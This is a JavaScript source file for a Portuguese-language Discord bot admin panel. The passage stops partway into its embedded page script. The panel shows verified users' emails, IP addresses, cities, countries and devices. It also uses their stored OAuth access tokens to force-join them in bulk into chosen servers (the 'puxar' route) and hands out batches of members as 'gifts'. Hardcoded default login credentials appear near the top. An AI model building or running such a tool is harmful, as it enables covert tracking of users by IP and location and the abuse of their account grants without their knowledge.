const crypto = require('crypto');
const axios = require('axios');

const sessoes = new Map();
const tentativas = new Map();

const USUARIO = process.env.PAINEL_USUARIO || 'Pedro';
const SENHA = process.env.PAINEL_SENHA || 'Polar';

function gerarToken() {
    return crypto.randomBytes(32).toString('hex');
}

module.exports = function(app, client, config, users) {

    app.post('/api/painel/login', async (req, res) => {
        const body = req.body || {};
        const usuario = body.usuario;
        const senha = body.senha;
        const ip = req.ip || 'desconhecido';

        const agora = Date.now();
        const reg = tentativas.get(ip) || { count: 0, primeira: agora };
        if (agora - reg.primeira > 60000) { reg.count = 0; reg.primeira = agora; }
        reg.count++;
        tentativas.set(ip, reg);

        if (reg.count > 5) return res.status(429).json({ error: 'Muitas tentativas. Aguarde 1 minuto.' });
        if (!usuario || !senha) return res.status(400).json({ error: 'Preencha usuário e senha.' });

        let ok1 = false, ok2 = false;
        try {
            ok1 = crypto.timingSafeEqual(Buffer.from(String(usuario).padEnd(64, ' ')), Buffer.from(USUARIO.padEnd(64, ' ')));
            ok2 = crypto.timingSafeEqual(Buffer.from(String(senha).padEnd(64, ' ')), Buffer.from(SENHA.padEnd(64, ' ')));
        } catch (e) {}

        if (!ok1 || !ok2) return res.status(401).json({ error: 'Usuário ou senha inválidos.' });

        const token = gerarToken();
        const csrf = crypto.randomBytes(16).toString('hex');
        const expiraEm = Date.now() + (24 * 60 * 60 * 1000);

        sessoes.set(token, { usuario: USUARIO, ip: ip, criadaEm: Date.now(), expiraEm: expiraEm, csrf: csrf });

        res.json({ token: token, csrf: csrf });
    });

    app.post('/api/painel/logout', (req, res) => {
        const token = req.headers['x-painel-token'];
        if (token) sessoes.delete(token);
        res.json({ ok: true });
    });

    function checkAuth(req, res, next) {
        const token = req.headers['x-painel-token'];
        if (!token) return res.status(401).json({ error: 'Não autenticado.' });
        const sessao = sessoes.get(token);
        if (!sessao) return res.status(401).json({ error: 'Sessão inválida.' });
        if (Date.now() > sessao.expiraEm) { sessoes.delete(token); return res.status(401).json({ error: 'Sessão expirada.' }); }
        if (req.method === 'POST' || req.method === 'DELETE' || req.method === 'PUT') {
            const csrf = req.headers['x-csrf-token'];
            if (csrf !== sessao.csrf) return res.status(403).json({ error: 'Token inválido.' });
        }
        req.sessao = sessao;
        next();
    }

    app.get('/api/painel/stats', checkAuth, async (req, res) => {
        try {
            const allUsers = await users.all();
            const gifts = (await config.get('gifts')) || {};
            const giftsArr = Object.values(gifts);

            const giftsAtivos = giftsArr.filter(function(g) { return g.status !== 'esgotado' && (!g.expiresAt || Date.now() <= g.expiresAt); }).length;
            const giftsUsados = giftsArr.filter(function(g) { return g.status === 'esgotado'; }).length;

            const cidades = {};
            allUsers.forEach(function(u) {
                const c = u.data && u.data.cidade;
                if (c && c !== 'Desconhecido') cidades[c] = (cidades[c] || 0) + 1;
            });
            const topCidades = Object.entries(cidades).sort(function(a, b) { return b[1] - a[1]; }).slice(0, 5).map(function(e) { return { cidade: e[0], count: e[1] }; });

            res.json({ total: allUsers.length, giftsAtivos: giftsAtivos, giftsUsados: giftsUsados, servidores: client.guilds.cache.size, topCidades: topCidades });
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.get('/api/painel/users', checkAuth, async (req, res) => {
        try {
            const allUsers = await users.all();
            const lista = allUsers.map(function(u) {
                return {
                    id: u._id || u.ID,
                    username: (u.data && u.data.username) || 'Desconhecido',
                    avatar: (u.data && u.data.avatar) || null,
                    email: (u.data && u.data.email) || null,
                    ip: (u.data && u.data.ip) || null,
                    cidade: (u.data && u.data.cidade) || 'Desconhecido',
                    estado: (u.data && u.data.estado) || 'Desconhecido',
                    pais: (u.data && u.data.pais) || 'Desconhecido',
                    verifiedAt: (u.data && u.data.verifiedAt) || null
                };
            });
            res.json(lista);
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.delete('/api/painel/users/:id', checkAuth, async (req, res) => {
        try {
            const id = req.params.id;
            const guildId = process.env.GUILD_ID;
            let roleId = process.env.ROLE_ID;
            try { const dbRole = await config.get('roleId'); if (dbRole) roleId = dbRole; } catch (e) {}

            if (guildId && roleId) {
                try {
                    await axios.delete('https://discord.com/api/v10/guilds/' + guildId + '/members/' + id + '/roles/' + roleId, {
                        headers: { Authorization: 'Bot ' + process.env.TOKEN }, validateStatus: false
                    });
                } catch (e) {}
            }
            await users.delete(id);
            res.json({ ok: true });
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.get('/api/painel/buscar/:id', checkAuth, async (req, res) => {
        try {
            const id = req.params.id;
            if (!/^\d{17,20}$/.test(id)) return res.status(400).json({ error: 'ID inválido. O ID tem entre 17 e 20 dígitos.' });

            const userData = await users.get(id);
            if (!userData) return res.json({ encontrado: false });

            res.json({
                encontrado: true, id: id,
                username: userData.username || 'Desconhecido',
                avatar: userData.avatar || null,
                email: userData.email || 'N/A',
                ip: userData.ip || 'N/A',
                cidade: userData.cidade || 'Desconhecido',
                estado: userData.estado || 'Desconhecido',
                pais: userData.pais || 'Desconhecido',
                userDevice: userData.userDevice || 'N/A',
                verifiedAt: userData.verifiedAt || null
            });
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.get('/api/painel/gifts', checkAuth, async (req, res) => {
        try {
            const gifts = (await config.get('gifts')) || {};
            const lista = Object.values(gifts).sort(function(a, b) { return b.criadoEm - a.criadoEm; });
            res.json(lista);
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.post('/api/painel/gifts', checkAuth, async (req, res) => {
        try {
            const body = req.body || {};
            const quantidade = parseInt(body.quantidade);
            const tempo = parseInt(body.tempo) || 0;
            const selecionados = body.selecionados || [];

            if (!quantidade || quantidade < 1) return res.status(400).json({ error: 'Quantidade inválida.' });

            const allUsers = await users.all();
            if (quantidade > allUsers.length) return res.status(400).json({ error: 'Só tem ' + allUsers.length + ' verificados.' });

            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
            let codigo = '';
            const gifts = (await config.get('gifts')) || {};
            let tentativas = 0;

            do {
                codigo = '';
                for (let i = 0; i < 6; i++) codigo += chars.charAt(Math.floor(Math.random() * chars.length));
                tentativas++;
            } while (gifts[codigo] && tentativas < 20);

            const expiresAt = tempo > 0 ? Date.now() + (tempo * 60 * 60 * 1000) : null;

            const gift = {
                codigo: codigo, quantidade: quantidade, usados: 0, criadoPor: 'PAINEL',
                criadoEm: Date.now(), expiresAt: expiresAt, status: 'ativo', servidorUsado: null,
                selecionados: selecionados.length > 0 ? selecionados : null
            };

            gifts[codigo] = gift;
            await config.set('gifts', gifts);

            const baseUrl = process.env.REDIRECT_URI ? process.env.REDIRECT_URI.replace('/oauth2/callback', '') : 'https://meubot-8p7l.onrender.com';
            res.json({ codigo: codigo, link: baseUrl + '/gift/' + codigo });
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.delete('/api/painel/gifts/:codigo', checkAuth, async (req, res) => {
        try {
            const codigo = req.params.codigo;
            const gifts = (await config.get('gifts')) || {};
            delete gifts[codigo];
            await config.set('gifts', gifts);
            res.json({ ok: true });
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.post('/api/painel/puxar', checkAuth, async (req, res) => {
        try {
            const body = req.body || {};
            const guildId = body.guildId;
            const quantidade = parseInt(body.quantidade) || 0;

            if (!/^\d{17,20}$/.test(guildId)) return res.status(400).json({ error: 'ID inválido.' });

            const guild = client.guilds.cache.get(guildId);
            if (!guild) return res.status(400).json({ error: 'O bot não está nesse servidor.' });

            const allUsers = await users.all();
            const toPull = quantidade > 0 ? allUsers.slice(0, quantidade) : allUsers;

            res.json({ mensagem: 'Puxando ' + toPull.length + ' membros pro servidor ' + guild.name + '.' });

            (async function() {
                for (let i = 0; i < toPull.length; i++) {
                    const u = toPull[i];
                    const userId = u._id || u.ID;
                    const accessToken = u.data && u.data.access_token;
                    if (!accessToken) continue;
                    try {
                        await axios.put('https://discord.com/api/v10/guilds/' + guildId + '/members/' + userId,
                            { access_token: accessToken },
                            { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false });
                    } catch (e) {}
                    await new Promise(function(r) { setTimeout(r, 600); });
                }
                console.log('✅ [PAINEL] puxada finalizada: ' + toPull.length + ' membros');
            })();
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.get('/api/painel/servers', checkAuth, (req, res) => {
        const lista = client.guilds.cache.map(function(g) {
            return { id: g.id, nome: g.name, membros: g.memberCount, dono: g.ownerId };
        });
        res.json(lista);
    });

    app.get('/api/painel/logs', checkAuth, async (req, res) => {
        try {
            const logs = (await config.get('serverLogs')) || [];
            res.json(logs.slice(-500).reverse());
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.get('/api/painel/config', checkAuth, async (req, res) => {
        try {
            res.json({
                logChannelId: (await config.get('logChannelId')) || '',
                giftLogChannelId: (await config.get('giftLogChannelId')) || '',
                roleId: (await config.get('roleId')) || ''
            });
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.post('/api/painel/config', checkAuth, async (req, res) => {
        try {
            const body = req.body || {};
            if (body.logChannelId) await config.set('logChannelId', body.logChannelId);
            if (body.giftLogChannelId) await config.set('giftLogChannelId', body.giftLogChannelId);
            if (body.roleId) await config.set('roleId', body.roleId);
            res.json({ ok: true });
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.get('/api/painel/bot/info', checkAuth, async (req, res) => {
        try {
            const presenca = client.user.presence;
            res.json({
                username: client.user.username,
                avatar: client.user.displayAvatarURL({ size: 256 }),
                status: presenca ? presenca.status : 'online',
                activity: presenca && presenca.activities && presenca.activities[0] ? presenca.activities[0].name : ''
            });
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.post('/api/painel/bot/username', checkAuth, async (req, res) => {
        try {
            const nome = req.body.username;
            if (!nome || nome.length < 2 || nome.length > 32) return res.status(400).json({ error: 'Nome deve ter entre 2 e 32 caracteres.' });
            try {
                await client.user.setUsername(nome);
                res.json({ ok: true, mensagem: 'Nome alterado para ' + nome });
            } catch (err) {
                if (err.code === 50035 || (err.message && err.message.includes('rate'))) return res.status(429).json({ error: 'Limite atingido. Aguarde 1 hora.' });
                return res.status(400).json({ error: err.message });
            }
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.post('/api/painel/bot/avatar', checkAuth, async (req, res) => {
        try {
            const url = req.body.url;
            if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: 'URL inválida.' });
            try {
                await client.user.setAvatar(url);
                res.json({ ok: true, mensagem: 'Avatar alterado com sucesso!' });
            } catch (err) {
                if (err.code === 50035 || (err.message && err.message.includes('rate'))) return res.status(429).json({ error: 'Limite atingido. Aguarde 1 hora.' });
                return res.status(400).json({ error: err.message });
            }
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.post('/api/painel/bot/status', checkAuth, async (req, res) => {
        try {
            const body = req.body || {};
            const tipo = body.tipo || 'Jogando';
            const texto = body.texto || '';
            const status = body.status || 'online';

            const tipos = { 'Jogando': 0, 'Ouvindo': 2, 'Assistindo': 3, 'Competindo': 5 };
            const tipoNum = tipos[tipo] !== undefined ? tipos[tipo] : 0;

            if (texto) await client.user.setActivity(texto, { type: tipoNum });

            const statusValidos = ['online', 'idle', 'dnd', 'invisible'];
            if (statusValidos.includes(status)) client.user.setStatus(status);

            res.json({ ok: true, mensagem: 'Status atualizado!' });
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.get('/painel', (req, res) => {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.send(getPainelHTML());
    });

};

function getPainelHTML() {
    let h = '';
    h += '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Painel</title><style>';

    h += '*{margin:0;padding:0;box-sizing:border-box}';

    h += 'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#0a0a0c;color:#d4d4d8;min-height:100vh;overflow-x:hidden}';

    h += 'body::before{content:"";position:fixed;top:0;left:0;right:0;bottom:0;background-image:linear-gradient(rgba(255,255,255,0.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.02) 1px,transparent 1px);background-size:60px 60px;pointer-events:none;z-index:0}';

    h += '.login-container{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;position:relative;z-index:1}';
    h += '.login-box{background:#111114;border:1px solid #1d1d20;border-radius:14px;padding:44px 40px;width:100%;max-width:380px;transition:border-color 0.3s}';
    h += '.login-box:hover{border-color:#26262b}';
    h += '.login-box h1{font-size:20px;margin-bottom:6px;color:#f4f4f5;font-weight:600;letter-spacing:-0.3px}';
    h += '.login-box p{color:#52525b;font-size:13px;margin-bottom:28px}';
    h += '.login-box input{width:100%;padding:12px 14px;background:#0a0a0c;border:1px solid #1d1d20;border-radius:8px;color:#e4e4e7;font-size:14px;font-family:inherit;margin-bottom:12px;outline:none;transition:border-color 0.2s,background 0.2s}';
    h += '.login-box input:hover{border-color:#26262b}';
    h += '.login-box input:focus{border-color:#3f3f46;background:#0d0d10}';
    h += '.login-box button{width:100%;padding:12px;background:#1a1a1e;color:#e4e4e7;border:1px solid #26262b;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit;transition:all 0.2s}';
    h += '.login-box button:hover{background:#202024;border-color:#3f3f46;transform:translateY(-1px)}';
    h += '.login-box button:active{transform:translateY(0)}';
    h += '.login-erro{color:#f87171;font-size:13px;margin-top:12px;min-height:18px}';

    h += '.app{display:none;min-height:100vh;position:relative;z-index:1}';
    h += '.app.ativo{display:flex;animation:fadeIn 0.4s ease}';
    h += '@keyframes fadeIn{from{opacity:0}to{opacity:1}}';

    h += '.sidebar{width:230px;background:#0d0d10;border-right:1px solid #16161a;padding:28px 16px;display:flex;flex-direction:column;position:fixed;height:100vh;overflow-y:auto;z-index:10}';
    h += '.sidebar-logo{font-size:15px;font-weight:600;padding:0 8px 24px;border-bottom:1px solid #16161a;margin-bottom:20px;color:#f4f4f5;letter-spacing:-0.2px}';
    h += '.sidebar-logo span{color:#71717a;font-weight:400}';
    h += '.sidebar-nav{display:flex;flex-direction:column;gap:2px;flex:1}';
    h += '.nav-item{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:7px;color:#71717a;font-size:13.5px;cursor:pointer;border:none;background:transparent;font-family:inherit;width:100%;text-align:left;transition:all 0.2s ease;position:relative}';
    h += '.nav-item:hover{background:#16161a;color:#d4d4d8;padding-left:14px}';
    h += '.nav-item.ativo{background:#1a1a1e;color:#f4f4f5}';
    h += '.nav-item.ativo::before{content:"";position:absolute;left:0;top:20%;bottom:20%;width:2px;background:#52525b;border-radius:2px}';
    h += '.sidebar-footer{padding-top:16px;border-top:1px solid #16161a;margin-top:16px}';
    h += '.btn-sair{padding:9px 16px;background:transparent;color:#71717a;border:1px solid #26262b;border-radius:7px;font-size:13px;cursor:pointer;font-family:inherit;width:100%;transition:all 0.2s}';
    h += '.btn-sair:hover{color:#f87171;border-color:#3f1f1f;background:#1a1010}';

    h += '.main{flex:1;margin-left:230px;padding:36px 40px;max-width:calc(100% - 230px);animation:fadeIn 0.5s ease}';
    h += '.main-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:32px}';
    h += '.main-header h1{font-size:22px;color:#f4f4f5;font-weight:600;letter-spacing:-0.3px}';

    h += '.cards-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:32px}';
    h += '.card{background:#111114;border:1px solid #1d1d20;border-radius:10px;padding:20px;transition:all 0.25s ease;cursor:default}';
    h += '.card:hover{border-color:#2d2d33;transform:translateY(-2px);background:#131317}';
    h += '.card-label{font-size:11px;color:#52525b;text-transform:uppercase;letter-spacing:0.6px;margin-bottom:8px;font-weight:500}';
    h += '.card-value{font-size:26px;font-weight:600;color:#e4e4e7;letter-spacing:-0.5px}';
    h += '.card-value.primary{color:#a1a1aa}.card-value.success{color:#4ade80}.card-value.warning{color:#fbbf24}';

    h += '.tabela-container{background:#111114;border:1px solid #1d1d20;border-radius:10px;overflow:hidden;margin-bottom:24px}';
    h += '.tabela-header{padding:16px 20px;border-bottom:1px solid #1d1d20;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap}';
    h += '.tabela-header h2{font-size:14.5px;color:#e4e4e7;font-weight:600;letter-spacing:-0.2px}';
    h += '.busca-input{padding:8px 12px;background:#0a0a0c;border:1px solid #1d1d20;border-radius:6px;color:#e4e4e7;font-size:13px;outline:none;width:240px;font-family:inherit;transition:all 0.2s}';
    h += '.busca-input:hover{border-color:#26262b}';
    h += '.busca-input:focus{border-color:#3f3f46;background:#0d0d10}';
    h += '.tabela-scroll{overflow-x:auto}';
    h += 'table{width:100%;border-collapse:collapse}';
    h += 'th{text-align:left;padding:11px 20px;font-size:10.5px;text-transform:uppercase;letter-spacing:0.6px;color:#52525b;border-bottom:1px solid #1d1d20;font-weight:500;white-space:nowrap}';
    h += 'td{padding:13px 20px;font-size:13px;border-bottom:1px solid #16161a;color:#a1a1aa;transition:color 0.15s}';
    h += 'tr:last-child td{border-bottom:none}';
    h += 'tbody tr{transition:background 0.15s}';
    h += 'tbody tr:hover{background:#131317}';
    h += 'tbody tr:hover td{color:#e4e4e7}';

    h += '.avatar-cell{display:flex;align-items:center;gap:10px}';
    h += '.avatar-cell img{width:32px;height:32px;border-radius:50%;border:1px solid #26262b;transition:border-color 0.2s}';
    h += 'tbody tr:hover .avatar-cell img{border-color:#3f3f46}';
    h += '.avatar-cell .nome{font-weight:500;color:#e4e4e7}';
    h += '.avatar-cell .id{font-size:11px;color:#52525b;font-family:"Courier New",monospace}';

    h += '.btn-acao{padding:5px 11px;border-radius:6px;border:1px solid #26262b;font-size:11.5px;cursor:pointer;font-family:inherit;background:transparent;color:#a1a1aa;transition:all 0.2s}';
    h += '.btn-acao:hover{background:#1a1010;color:#f87171;border-color:#3f1f1f}';

    h += '.btn-primary{padding:10px 20px;background:#1a1a1e;color:#e4e4e7;border:1px solid #26262b;border-radius:7px;font-size:13px;font-weight:500;cursor:pointer;font-family:inherit;transition:all 0.2s}';
    h += '.btn-primary:hover{background:#202024;border-color:#3f3f46;transform:translateY(-1px)}';
    h += '.btn-primary:active{transform:translateY(0)}';
    h += '.btn-primary:disabled{opacity:0.4;cursor:not-allowed;transform:none}';

    h += '.form-group{margin-bottom:16px}';
    h += '.form-group label{display:block;font-size:12.5px;color:#71717a;margin-bottom:6px}';
    h += '.form-group input,.form-group select{width:100%;padding:10px 12px;background:#0a0a0c;border:1px solid #1d1d20;border-radius:6px;color:#e4e4e7;font-size:13px;outline:none;font-family:inherit;transition:all 0.2s}';
    h += '.form-group input:hover,.form-group select:hover{border-color:#26262b}';
    h += '.form-group input:focus,.form-group select:focus{border-color:#3f3f46;background:#0d0d10}';
    h += '.form-group select[multiple]{padding:6px}';
    h += '.form-group select[multiple] option{padding:6px 8px;border-radius:4px}';
    h += '.form-group small{display:block;margin-top:6px;font-size:11.5px;color:#fbbf24;opacity:0.8}';

    h += '.toast{position:fixed;bottom:24px;right:24px;background:#111114;border:1px solid #26262b;border-radius:9px;padding:14px 20px;font-size:13px;box-shadow:0 12px 40px rgba(0,0,0,0.5);transform:translateY(100px);opacity:0;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);z-index:9999;max-width:320px;color:#e4e4e7}';
    h += '.toast.ativo{transform:translateY(0);opacity:1}';
    h += '.toast.sucesso{border-color:#1f3a26;color:#4ade80}';
    h += '.toast.erro{border-color:#3f1f1f;color:#f87171}';

    h += '.pagina{display:none}';
    h += '.pagina.ativo{display:block;animation:fadeIn 0.3s ease}';

    h += '.resultado-box{background:#0d0d10;border:1px solid #1d1d20;border-radius:9px;padding:18px;font-size:13px;line-height:1.6;color:#a1a1aa;animation:fadeIn 0.3s ease}';
    h += '.resultado-box.sucesso{border-color:#1f3a26}';
    h += '.resultado-box.erro{border-color:#3f1f1f}';

    h += '.badge{display:inline-block;padding:3px 9px;border-radius:5px;font-size:10.5px;font-weight:500;letter-spacing:0.2px}';
    h += '.badge.success{background:#0f1f14;color:#4ade80}';
    h += '.badge.danger{background:#1f0f0f;color:#f87171}';
    h += '.badge.warning{background:#1f180a;color:#fbbf24}';

    h += '.menu-toggle{display:none;position:fixed;top:16px;left:16px;z-index:1000;background:#111114;border:1px solid #1d1d20;color:#e4e4e7;padding:10px 14px;border-radius:8px;cursor:pointer;font-size:16px;transition:all 0.2s}';
    h += '.menu-toggle:hover{background:#16161a;border-color:#26262b}';

    h += '@media(max-width:768px){.menu-toggle{display:block}.sidebar{transform:translateX(-100%);transition:transform 0.3s ease}.sidebar.aberto{transform:translateX(0)}.main{margin-left:0;max-width:100%;padding:72px 16px 24px}.busca-input{width:100%}.ocultar-mobile{display:none}.main-header h1{font-size:18px}}';

    h += '</style></head><body>';

    // LOGIN
    h += '<div class="login-container" id="loginContainer"><div class="login-box"><h1>Painel Admin</h1><p>Faça login pra continuar</p><input type="text" id="loginUsuario" placeholder="Usuário"><input type="password" id="loginSenha" placeholder="Senha"><button onclick="fazerLogin()">Entrar</button><div class="login-erro" id="loginErro"></div></div></div>';

    // APP
    h += '<div class="app" id="app"><button class="menu-toggle" onclick="toggleSidebar()">☰</button><aside class="sidebar" id="sidebar"><div class="sidebar-logo">Fuzion <span>Painel</span></div><nav class="sidebar-nav">';
    h += '<button class="nav-item ativo" data-pagina="dashboard" onclick="mostrarPagina(\'dashboard\')">Dashboard</button>';
    h += '<button class="nav-item" data-pagina="verificados" onclick="mostrarPagina(\'verificados\')">Verificados</button>';
    h += '<button class="nav-item" data-pagina="buscar" onclick="mostrarPagina(\'buscar\')">Buscar</button>';
    h += '<button class="nav-item" data-pagina="criar-gift" onclick="mostrarPagina(\'criar-gift\')">Criar Gift</button>';
    h += '<button class="nav-item" data-pagina="deletar-gift" onclick="mostrarPagina(\'deletar-gift\')">Deletar Gift</button>';
    h += '<button class="nav-item" data-pagina="puxar" onclick="mostrarPagina(\'puxar\')">Puxar</button>';
    h += '<button class="nav-item" data-pagina="servidores" onclick="mostrarPagina(\'servidores\')">Servidores</button>';
    h += '<button class="nav-item" data-pagina="logs" onclick="mostrarPagina(\'logs\')">Logs</button>';
    h += '<button class="nav-item" data-pagina="bot" onclick="mostrarPagina(\'bot\')">Bot</button>';
    h += '<button class="nav-item" data-pagina="config" onclick="mostrarPagina(\'config\')">Config</button>';
    h += '</nav><div class="sidebar-footer"><button class="btn-sair" onclick="fazerLogout()">Sair</button></div></aside>';

    h += '<main class="main"><div class="main-header"><h1 id="tituloPagina">Dashboard</h1></div>';

    // DASHBOARD
    h += '<div class="pagina ativo" id="pagina-dashboard"><div class="cards-grid" id="cardsStats"></div><div class="tabela-container"><div class="tabela-header"><h2>Top 5 Cidades</h2></div><div class="tabela-scroll"><table><thead><tr><th>#</th><th>Cidade</th><th>Usuários</th></tr></thead><tbody id="topCidades"></tbody></table></div></div></div>';

    // VERIFICADOS
    h += '<div class="pagina" id="pagina-verificados"><div class="tabela-container"><div class="tabela-header"><h2>Verificados (<span id="totalVerificados">0</span>)</h2><input type="text" class="busca-input" id="buscaVerificados" placeholder="Buscar..." oninput="filtrarVerificados()"></div><div class="tabela-scroll"><table><thead><tr><th>Usuário</th><th class="ocultar-mobile">Localização</th><th class="ocultar-mobile">Email</th><th class="ocultar-mobile">IP</th><th class="ocultar-mobile">Data</th><th>Ações</th></tr></thead><tbody id="tabelaVerificados"></tbody></table></div></div></div>';

    // BUSCAR
    h += '<div class="pagina" id="pagina-buscar"><div class="tabela-container" style="padding:24px"><h2 style="margin-bottom:16px;font-size:15px;color:#e4e4e7">Buscar Usuário</h2><p style="color:#52525b;font-size:12.5px;margin-bottom:20px">Cole o ID do Discord de uma pessoa pra ver os dados dela (se ela estiver verificada).</p><div style="display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap"><input type="text" id="buscarId" placeholder="Ex: 1546499854652547113" maxlength="20" style="flex:1;min-width:200px;padding:10px 12px;background:#0a0a0c;border:1px solid #1d1d20;border-radius:6px;color:#e4e4e7;font-size:13px;outline:none;font-family:inherit;transition:all 0.2s"><button class="btn-primary" onclick="buscarUsuario()" id="btnBuscar">Buscar</button></div><div id="resultadoBuscar"></div></div></div>';

    // CRIAR GIFT
    h += '<div class="pagina" id="pagina-criar-gift"><div class="tabela-container" style="padding:24px"><h2 style="margin-bottom:20px;font-size:15px;color:#e4e4e7">Criar Gift</h2><div class="form-group"><label>Quantidade de membros</label><input type="number" id="giftQuantidade" min="1" placeholder="Ex: 5"></div><div class="form-group"><label>Tempo de expiração</label><select id="giftTempo"><option value="1">1 hora</option><option value="6">6 horas</option><option value="24">24 horas</option><option value="168" selected>7 dias</option><option value="720">30 dias</option><option value="0">Nunca expira</option></select></div><div class="form-group"><label><input type="checkbox" id="giftSelecionar" onchange="toggleSelecionarUsuarios()" style="width:auto;margin-right:8px"> Selecionar usuários específicos</label></div><div class="form-group" id="containerUsuarios" style="display:none"><label>Usuários</label><select id="giftUsuarios" multiple style="height:200px"></select></div><button class="btn-primary" onclick="criarGift()" id="btnCriarGift">Criar Gift</button><div id="resultadoGift"></div></div></div>';

    // DELETAR GIFT
    h += '<div class="pagina" id="pagina-deletar-gift"><div class="tabela-container"><div class="tabela-header"><h2>Gifts</h2></div><div class="tabela-scroll"><table><thead><tr><th>Código</th><th>Quantidade</th><th>Status</th><th>Expira</th><th>Ações</th></tr></thead><tbody id="tabelaGifts"></tbody></table></div></div></div>';

    // PUXAR
    h += '<div class="pagina" id="pagina-puxar"><div class="tabela-container" style="padding:24px"><h2 style="margin-bottom:20px;font-size:15px;color:#e4e4e7">Puxar Membros</h2><div class="form-group"><label>ID do servidor</label><input type="text" id="puxarGuildId" placeholder="Ex: 1234567890123456789" maxlength="20"></div><div class="form-group"><label>Quantidade (0 = todos)</label><input type="number" id="puxarQuantidade" min="0" value="0"></div><button class="btn-primary" onclick="puxarMembros()" id="btnPuxar">Puxar</button><div id="resultadoPuxar"></div></div></div>';

    // SERVIDORES
    h += '<div class="pagina" id="pagina-servidores"><div class="tabela-container"><div class="tabela-header"><h2>Servidores</h2></div><div class="tabela-scroll"><table><thead><tr><th>Servidor</th><th>ID</th><th class="ocultar-mobile">Membros</th></tr></thead><tbody id="tabelaServidores"></tbody></table></div></div></div>';

    // LOGS
    h += '<div class="pagina" id="pagina-logs"><div class="tabela-container"><div class="tabela-header"><h2>Logs</h2><select class="busca-input" id="filtroLogs" onchange="filtrarLogs()"><option value="todos">Todos</option><option value="entrou">Entrou</option><option value="saiu">Saiu</option><option value="ban">Ban</option><option value="kick">Kick</option><option value="mute">Mute</option><option value="unmute">Unmute</option><option value="verificacao">Verificação</option><option value="gift">Gift</option></select></div><div class="tabela-scroll"><table><thead><tr><th>Data</th><th>Tipo</th><th>Usuário</th><th class="ocultar-mobile">Detalhes</th></tr></thead><tbody id="tabelaLogs"></tbody></table></div></div></div>';

    // BOT
    h += '<div class="pagina" id="pagina-bot"><div class="tabela-container" style="padding:24px"><h2 style="margin-bottom:20px;font-size:15px;color:#e4e4e7">Personalização do Bot</h2>';
    h += '<div class="form-group"><label>Nome do Bot</label><input type="text" id="botUsername" placeholder="Ex: MeuBot" maxlength="32"><small>Limite: 2 mudanças por hora</small></div>';
    h += '<button class="btn-primary" onclick="salvarUsername()" id="btnUsername">Salvar Nome</button><div id="resultadoUsername"></div>';
    h += '<div style="margin-top:32px;padding-top:24px;border-top:1px solid #1d1d20"><div class="form-group"><label>Avatar do Bot (URL da imagem)</label><input type="text" id="botAvatar" placeholder="https://exemplo.com/imagem.png"><small>Limite: 2 mudanças por hora</small></div>';
    h += '<button class="btn-primary" onclick="salvarAvatar()" id="btnAvatar">Salvar Avatar</button><div id="resultadoAvatar"></div></div>';
    h += '<div style="margin-top:32px;padding-top:24px;border-top:1px solid #1d1d20"><h3 style="margin-bottom:16px;font-size:14px;color:#e4e4e7;font-weight:600">Status / Atividade</h3>';
    h += '<div class="form-group"><label>Tipo</label><select id="botStatusTipo"><option value="Jogando">Jogando</option><option value="Ouvindo">Ouvindo</option><option value="Assistindo">Assistindo</option><option value="Competindo">Competindo</option></select></div>';
    h += '<div class="form-group"><label>Texto</label><input type="text" id="botStatusTexto" placeholder="Ex: Minecraft" maxlength="128"></div>';
    h += '<div class="form-group"><label>Status online</label><select id="botStatusOnline"><option value="online">Online</option><option value="idle">Ausente</option><option value="dnd">Não perturbe</option><option value="invisible">Invisível</option></select></div>';
    h += '<button class="btn-primary" onclick="salvarStatus()" id="btnStatus">Salvar Status</button><div id="resultadoStatus"></div></div>';
    h += '</div></div>';

    // CONFIG
    h += '<div class="pagina" id="pagina-config"><div class="tabela-container" style="padding:24px"><h2 style="margin-bottom:20px;font-size:15px;color:#e4e4e7">Configurações</h2><div class="form-group"><label>Canal de logs de verificação</label><input type="text" id="cfgLogChannel" placeholder="ID do canal"></div><div class="form-group"><label>Canal de logs de gift</label><input type="text" id="cfgGiftLogChannel" placeholder="ID do canal"></div><div class="form-group"><label>Cargo de verificado</label><input type="text" id="cfgRoleId" placeholder="ID do cargo"></div><button class="btn-primary" onclick="salvarConfig()" id="btnSalvarConfig">Salvar</button><div id="resultadoConfig"></div></div></div>';

    h += '</main></div><div class="toast" id="toast"></div>';

    h += '<script>';
    h += 'var TOKEN=localStorage.getItem("painel_token");var CSRF=localStorage.getItem("painel_csrf");var USUARIOS_CACHE=[];var GIFTS_CACHE=[];var LOGS_CACHE=[];';

